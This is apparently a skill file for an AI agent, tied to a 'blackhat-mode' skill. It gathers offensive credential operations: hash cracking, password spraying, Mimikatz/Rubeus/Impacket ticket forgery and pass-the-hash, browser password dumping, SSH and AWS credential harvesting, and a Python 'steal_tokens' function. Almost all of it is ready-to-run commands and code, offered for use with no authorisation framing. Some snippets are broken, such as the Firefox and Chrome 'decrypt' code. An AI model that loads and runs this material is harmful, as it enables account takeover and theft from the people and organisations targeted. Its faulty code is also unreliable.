---
name: cred-tools
description: "Credential operations — hash cracking, password spraying, token theft, credential dumping."
version: 2.0.0
author: Yatim
metadata:
  hermes:
    tags: [cred, password, hash, token, dump, spray, crack]
    related_skills: [blackhat-mode, post-tools, stealth-tools]
prerequisites:
  commands: [python]
---

# Credential Tools — Complete Credential Operations

## When to Load This Skill

User requests:
- "credential", "password", "hash", "token", "dump", "spray", "crack"

---

## Hash Cracking

### Hashcat

```bash
# MD5
hashcat -m 0 hash.txt wordlist.txt

# SHA1
hashcat -m 100 hash.txt wordlist.txt

# SHA256
hashcat -m 1400 hash.txt wordlist.txt

# NTLM
hashcat -m 1000 hash.txt wordlist.txt

# bcrypt
hashcat -m 3200 hash.txt wordlist.txt

# Rules
hashcat -m 0 hash.txt wordlist.txt -r rules/best64.rule

# Attack modes
hashcat -m 0 hash.txt wordlist.txt -a 0  # Straight
hashcat -m 0 hash.txt wordlist.txt -a 3  # Brute force
hashcat -m 0 hash.txt wordlist.txt -a 6  # Hybrid wordlist + mask
```

### John the Ripper

```bash
# Auto-detect
john hash.txt

# Wordlist
john --wordlist=rockyou.txt hash.txt

# Format
john --format=raw-md5 hash.txt

# Show
john --show hash.txt

# Rules
john --wordlist=rockyou.txt --rules=best64 hash.txt
```

### Online Cracking

```bash
# CrackStation
curl -X POST https://crackstation.net/api -d "hash=HASH"

# Hashes.com
curl -X POST https://hashes.com/en/api/hash -d "hash=HASH"
```

---

## Password Spraying

### CrackMapExec

```bash
# SMB spray
crackmapexec smb TARGET -u users.txt -p 'Password123'

# SSH spray
crackmapexec ssh TARGET -u users.txt -p 'Password123'

# WinRM spray
crackmapexec winrm TARGET -u users.txt -p 'Password123'

# LDAP spray
crackmapexec ldap TARGET -u users.txt -p 'Password123'
```

### Hydra

```bash
# SSH
hydra -l user -P passwords.txt ssh://TARGET

# HTTP form
hydra -l admin -P passwords.txt TARGET http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# FTP
hydra -l admin -P passwords.txt ftp://TARGET

# RDP
hydra -l administrator -P passwords.txt rdp://TARGET
```

### Ncrack

```bash
# SSH
ncrack -p ssh --user user -P passwords.txt TARGET

# RDP
ncrack -p rdp --user administrator -P passwords.txt TARGET
```

---

## Token Theft

### Mimikatz

```bash
# Debug privilege
privilege::debug

# Token elevation
token::elevate

# Dump hashes
lsadump::sam
lsadump::lsa /patch

# Kerberos tickets
kerberos::list
kerberos::ptt ticket.kirbi

# Golden ticket
kerberos::golden /user:admin /domain:DOMAIN /sid:S-1-5-21-... /krbtgt:HASH /ptt

# Silver ticket
kerberos::golden /user:admin /domain:DOMAIN /sid:S-1-5-21-... /target:SERVICE /service:ldap /ptt
```

### Rubeus

```bash
# Harvest
Rubeus.exe harvest /interval:30

# Kerberoast
Rubeus.exe kerberoast /outfile:hashes.txt

# AS-REP roast
Rubeus.exe asreproast /outfile:hashes.txt

# Pass the ticket
Rubeus.exe ptt /ticket:ticket.kirbi

# Golden ticket
Rubeus.exe golden /rc4:HASH /user:admin /domain:DOMAIN
```

### Impacket

```bash
# Secrets dump
secretsdump.py DOMAIN/user:password@TARGET

# Pass the hash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:HASH DOMAIN/user@TARGET

# Kerberoast
GetUserSPNs.py DOMAIN/user:password -request

# AS-REP roast
GetNPUsers.py DOMAIN/ -usersfile users.txt -format hashcat -outputfile hashes.txt
```

---

## Browser Credential Dump

### Chrome

```bash
# Linux
~/.config/google-chrome/Default/Login Data

# Windows
%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data

# Decrypt
python -c "
import sqlite3, os
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

db = sqlite3.connect(os.path.expanduser('~/.config/google-chrome/Default/Login Data'))
cursor = db.cursor()
cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
for row in cursor.fetchall():
    print(f'URL: {row[0]}, User: {row[1]}, Pass: {row[2]}')
"
```

### Firefox

```bash
# Location
~/.mozilla/firefox/*.default/logins.json

# Decrypt
python -c "
import json, os
from base64 import b64decode

logins = json.load(open(os.path.expanduser('~/.mozilla/firefox/*.default/logins.json')))
for login in logins['logins']:
    print(f'URL: {login[\"encryptedUsername\"]}')
"
```

---

## SSH Credential Theft

```bash
# SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "id_ecdsa" 2>/dev/null
find / -name "id_ed25519" 2>/dev/null

# SSH config
cat ~/.ssh/config
cat ~/.ssh/known_hosts

# Agent forwarding
env | grep SSH_AUTH_SOCK
ssh-add -l
```

---

## AWS Credential Theft

```bash
# Environment variables
env | grep AWS

# Config files
cat ~/.aws/credentials
cat ~/.aws/config

# IMDS
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# ECS metadata
curl http://169.254.170.2/v2/metadata
```

---

## Python Credential Tools

### Hash Cracker

```python
import hashlib
import itertools

def crack_md5(hash_value, wordlist):
    for word in wordlist:
        if hashlib.md5(word.encode()).hexdigest() == hash_value:
            return word
    return None

def crack_sha1(hash_value, wordlist):
    for word in wordlist:
        if hashlib.sha1(word.encode()).hexdigest() == hash_value:
            return word
    return None
```

### Password Generator

```python
import random
import string

def generate_password(length=12):
    chars = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(chars) for _ in range(length))

def generate_wordlist(patterns, output_file):
    with open(output_file, 'w') as f:
        for pattern in patterns:
            for combo in itertools.product(*[string.ascii_lowercase if c == 'a' else 
                                            string.digits if c == 'd' else 
                                            string.ascii_uppercase if c == 'A' else [c] 
                                            for c in pattern]):
                f.write(''.join(combo) + '\n')
```

### Token Stealer

```python
import os
import re

def steal_tokens():
    tokens = {}
    
    # Environment variables
    for key, value in os.environ.items():
        if any(keyword in key.lower() for keyword in ['token', 'key', 'secret', 'password']):
            tokens[key] = value
    
    # Config files
    config_paths = [
        os.path.expanduser('~/.aws/credentials'),
        os.path.expanduser('~/.config/gcloud/credentials.db'),
        os.path.expanduser('~/.docker/config.json'),
    ]
    
    for path in config_paths:
        if os.path.exists(path):
            with open(path, 'r') as f:
                tokens[path] = f.read()
    
    return tokens
```

---

## Output Format

```json
{
  "target": "192.168.1.100",
  "credentials": [
    {"type": "hash", "format": "NTLM", "value": "HASH", "cracked": "password123"},
    {"type": "token", "format": "kerberos", "value": "TGT-..."},
    {"type": "key", "path": "/root/.ssh/id_rsa", "value": "PRIVATE_KEY"}
  ],
  "spray_results": [
    {"user": "admin", "pass": "Password123", "success": true}
  ]
}
```

---

## Error Handling

| Error | Cause | Solution |
|-------|-------|----------|
| Permission denied | Need root/admin | Try privesc |
| Hash not found | No hashes dumped | Try different dump method |
| Crack failed | Weak wordlist | Try larger wordlist + rules |
| Token expired | Old ticket | Request new ticket |
| Connection refused | Target unreachable | Check network |
